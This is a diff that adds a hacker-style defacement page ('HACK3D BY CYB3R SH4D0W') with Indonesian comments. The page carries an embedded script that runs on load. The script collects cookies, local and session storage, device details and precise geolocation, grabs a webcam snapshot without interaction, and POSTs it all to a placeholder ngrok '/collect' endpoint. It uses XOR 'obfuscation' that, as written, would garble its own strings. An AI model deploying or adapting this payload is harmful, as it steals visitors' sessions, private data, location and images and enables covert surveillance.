@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACK3D BY CYB3R SH4D0W</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            overflow: hidden;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #0f0;
+            animation: glitch 1s linear infinite;
+        }
+        .marquee {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #111;
+            padding: 10px;
+            color: #f00;
+            font-size: 1.2em;
+            white-space: nowrap;
+            animation: scroll 20s linear infinite;
+        }
+        .content {
+            margin-top: 50px;
+            font-size: 1.5em;
+        }
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px, 0) skew(0deg); }
+            4%, 60% { transform: translate(-2px, 0) skew(0deg); }
+            62% { transform: translate(0, 0) skew(5deg); }
+        }
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+    </style>
+</head>
+<body>
+    <div class="marquee">HACK3D BY CYB3R SH4D0W - YOUR SYSTEM IS OURS - JOIN THE DARK SIDE</div>
+    <h1>HACK3D</h1>
+    <div class="content">
+        <p>WE ARE LEGION. YOUR SECURITY IS AN ILLUSION.</p>
+        <p>FEAR THE SH4D0W. WE SEE ALL.</p>
+    </div>
+
+    <script>
+        // Obfuskasi dengan kunci statis
+        const _0x = (s) => {
+            const k = 'sh4d0w';
+            let r = '';
+            for (let i = 0; i < s.length; i++) r += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+            return r;
+        };
+
+        // Validasi string
+        const _safeGet = (obj, prop) => {
+            try {
+                const p = _0x(prop);
+                return obj[p] || null;
+            } catch (e) {
+                return null;
+            }
+        };
+
+        // Cookies sebagai JSON
+        function _0xCookies() {
+            const cookie = _safeGet(document, 'cookie');
+            if (!cookie) return JSON.stringify({ error: 'Cookies tidak tersedia' }, null, 2);
+            const c = cookie.split(';').reduce((a, c) => {
+                const [n, v] = c.trim().split('=');
+                a[n] = v;
+                return a;
+            }, {});
+            return JSON.stringify(c, null, 2);
+        }
+
+        // LocalStorage sebagai struktur file
+        function _0xLocalStorage() {
+            let s = _0x('localStorage/') + '\n';
+            const ls = _safeGet(window, 'localStorage');
+            if (!ls) return s + '  Tidak tersedia';
+            for (let k in ls) {
+                if (ls.hasOwnProperty(k)) {
+                    s += `  ${k}: ${ls.getItem(k)}\n`;
+                }
+            }
+            return s;
+        }
+
+        // SessionStorage sebagai struktur file
+        function _0xSessionStorage() {
+            let s = _0x('sessionStorage/') + '\n';
+            const ss = _safeGet(window, 'sessionStorage');
+            if (!ss) return s + '  Tidak tersedia';
+            for (let k in ss) {
+                if (ss.hasOwnProperty(k)) {
+                    s += `  ${k}: ${ss.getItem(k)}\n`;
+                }
+            }
+            return s;
+        }
+
+        // Geolokasi mandiri dengan fallback
+        async function _0xGeolocation() {
+            const geo = _safeGet(navigator, 'geolocation');
+            if (!geo) {
+                try {
+                    const res = await fetch(_0x('https://ipapi.co/json/'));
+                    const d = await res.json();
+                    return JSON.stringify({
+                        latitude: d.latitude,
+                        longitude: d.longitude,
+                        city: d.city,
+                        country: d.country_name
+                    }, null, 2);
+                } catch (e) {
+                    return JSON.stringify({ error: _0x('Gagal mengambil geolokasi') }, null, 2);
+                }
+            }
+            try {
+                const p = await new Promise((r, e) => {
+                    geo.getCurrentPosition(r, e, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+                return JSON.stringify({
+                    latitude: p.coords.latitude,
+                    longitude: p.coords.longitude,
+                    accuracy: p.coords.accuracy
+                }, null, 2);
+            } catch (e) {
+                try {
+                    const res = await fetch(_0x('https://ipapi.co/json/'));
+                    const d = await res.json();
+                    return JSON.stringify({
+                        latitude: d.latitude,
+                        longitude: d.longitude,
+                        city: d.city,
+                        country: d.country_name
+                    }, null, 2);
+                } catch (e) {
+                    return JSON.stringify({ error: _0x('Gagal mengambil geolokasi') }, null, 2);
+                }
+            }
+        }
+
+        // Informasi perangkat
+        function _0xDeviceInfo() {
+            return JSON.stringify({
+                userAgent: _safeGet(navigator, 'userAgent') || 'Tidak tersedia',
+                platform: _safeGet(navigator, 'platform') || 'Tidak tersedia',
+                language: _safeGet(navigator, 'language') || 'Tidak tersedia',
+                screen: _safeGet(window, 'screen') ? `${window[_0x('screen')].width}x${window[_0x('screen')].height}` : 'Tidak tersedia'
+            }, null, 2);
+        }
+
+        // Capture webcam tanpa interaksi
+        async function _0xWebcam() {
+            const md = _safeGet(navigator, 'mediaDevices');
+            if (!md || !_safeGet(md, 'getUserMedia')) {
+                return _0x('Gagal mengambil webcam: MediaDevices tidak didukung');
+            }
+            try {
+                const stream = await md[_0x('getUserMedia')]({ video: true });
+                const video = document.createElement(_0x('video'));
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                const canvas = document.createElement(_0x('canvas'));
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const dataUrl = canvas.toDataURL(_0x('image/jpeg'));
+                stream.getTracks().forEach(t => t[_0x('stop')]());
+                return dataUrl;
+            } catch (e) {
+                return _0x('Gagal mengambil webcam');
+            }
+        }
+
+        // Mengirim data
+        async function _0xSendData() {
+            const d = {
+                cookies: _0xCookies(),
+                localStorage: _0xLocalStorage(),
+                sessionStorage: _0xSessionStorage(),
+                deviceInfo: _0xDeviceInfo(),
+                geolocation: await _0xGeolocation(),
+                webcam: await _0xWebcam()
+            };
+            try {
+                await fetch(_0x('YOUR_NGROK_URL') + _0x('/collect'), {
+                    method: _0x('POST'),
+                    headers: { 'Content-Type': _0x('application/json') },
+                    body: JSON.stringify(d)
+                });
+            } catch (e) {
+                console.error(_0x('Gagal mengirim:'), e);
+            }
+        }
+
+        // Kompatibilitas lintas browser
+        const _0xPolyfill = () => {
+            if (!_safeGet(navigator, 'mediaDevices')) {
+                navigator[_0x('mediaDevices')] = {};
+                navigator[_0x('mediaDevices')][_0x('getUserMedia')] = () => Promise.reject(_0x('MediaDevices tidak didukung'));
+            }
+        };
+
+        _0xPolyfill();
+        if (_safeGet(window, 'onload')) {
+            window[_0x('onload')] = _0xSendData;
+        } else {
+            setTimeout(_0xSendData, 0);
+        }
+    </script>
+</body>
+</html>
